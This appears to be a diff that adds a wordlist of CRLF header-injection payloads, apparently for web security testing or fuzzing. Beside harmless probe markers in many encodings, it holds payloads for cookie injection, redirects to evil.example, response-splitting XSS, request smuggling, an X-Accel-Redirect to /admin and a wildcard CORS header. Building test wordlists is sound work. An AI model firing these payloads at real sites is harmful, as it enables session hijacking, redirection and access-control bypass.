@@ -1,0 +1,16 @@
+# Generic CRLF advanced payloads
+%0d%0aX-Injected: probe
+%0aX-Injected: probe
+\r\nX-Injected: probe
+\nX-Injected: probe
+%0d%0aSet-Cookie: injected=true
+%0d%0aLocation: https://evil.example
+%0d%0aContent-Length: 0%0d%0a%0d%0a
+%0d%0a%0d%0a<script>alert(1)</script>
+%250d%250aX-Injected: probe
+%u000d%u000aX-Injected: probe
+%E5%98%8A%E5%98%8DX-Injected:%20probe
+%0d%0aTransfer-Encoding: chunked
+%0d%0aX-Accel-Redirect: /admin
+%0d%0aRefresh: 0;url=https://evil.example
+%0d%0aAccess-Control-Allow-Origin: *
